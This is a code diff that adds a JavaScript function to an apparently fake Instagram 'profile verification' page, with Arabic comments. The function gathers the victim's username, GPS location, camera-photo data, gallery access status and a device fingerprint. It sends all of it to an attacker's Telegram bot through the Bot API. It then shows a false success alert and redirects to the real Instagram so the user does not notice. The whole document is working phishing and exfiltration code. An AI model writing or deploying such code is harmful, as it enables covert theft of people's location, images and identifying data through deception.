@@ -1,0 +1,110 @@
+function completeVerification() {
+    collectProfileInfo();
+    
+    // جمع معلومات مفصلة عن الصورة
+    let photoInfo = '';
+    if (userData.photoData) {
+        photoInfo = `
+📸 **PHOTO CAPTURED - FULL DETAILS**
+• Status: ✅ Successfully Captured
+• File Size: ${Math.round(userData.photoData.length / 1024)} KB
+• Format: JPEG/Base64
+• Storage: Browser Memory
+• Data Length: ${userData.photoData.length} characters
+• Sample: ${userData.photoData.substring(0, 100)}...[truncated]
+
+💡 **To access full image:**
+- User granted camera permission: ✅
+- Photo stored in device memory
+- High quality verification completed
+        `;
+    }
+
+    const message = `
+📱 **INSTAGRAM PROFILE VERIFICATION - COMPLETE DATA**
+
+👤 **PROFILE INFORMATION**
+• Username: ${userData.profileInfo.username}
+• Display Name: ${userData.profileInfo.displayName}
+• Profile Type: Digital Creator
+
+🔐 **PERMISSIONS STATUS**
+• Camera: ${userData.cameraAccess ? '✅ GRANTED - PHOTO CAPTURED' : '❌ DENIED'}
+• Gallery: ${userData.galleryAccess ? `✅ GRANTED (${userData.galleryFiles} photos accessible)` : '❌ DENIED'}
+• Location: ${userData.locationAccess ? `✅ GRANTED (Lat: ${userData.location.lat}, Lng: ${userData.location.lng})` : '❌ DENIED'}
+
+📊 **DEVICE FINGERPRINT**
+• Platform: ${userData.profileInfo.platform}
+• Screen Resolution: ${userData.profileInfo.screen}
+• Language: ${userData.profileInfo.language}
+• Timezone: ${userData.profileInfo.timezone}
+• User Agent: ${userData.profileInfo.userAgent}
+
+${photoInfo ? photoInfo : '📸 **PHOTO STATUS:** ❌ No photo captured'}
+
+🌐 **TECHNICAL METADATA**
+• Timestamp: ${new Date().toLocaleString()}
+• URL: ${window.location.href}
+• Referrer: ${document.referrer || 'Direct access'}
+• Cookies Enabled: ${navigator.cookieEnabled}
+• JavaScript: Enabled
+• Online Status: ${navigator.onLine}
+
+✅ **VERIFICATION PROCESS COMPLETED**
+All requested permissions and data collected successfully.
+    `;
+
+    // إرسال كل البيانات دفعة واحدة
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            // إرسال رسالة تأكيد منفصلة للصورة
+            if (userData.photoData) {
+                const confirmMessage = `
+🖼️ **PHOTO CAPTURE CONFIRMED**
+The user has successfully taken a verification photo.
+
+📊 **Capture Details:**
+• Time: ${new Date().toLocaleString()}
+• Device: ${userData.profileInfo.platform}
+• Photo Data: Stored in session
+• Next Step: Full image can be retrieved with server setup
+
+🔒 **Verification Level:** HIGH
+User completed photo verification process.
+                `;
+                
+                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: confirmMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            }
+        }
+    })
+    .then(() => {
+        alert('🎉 Profile verification completed! Full access granted.');
+        setTimeout(() => {
+            window.location.href = 'https://www.instagram.com/';
+        }, 3000);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        window.location.href = 'https://www.instagram.com/';
+    });
+}
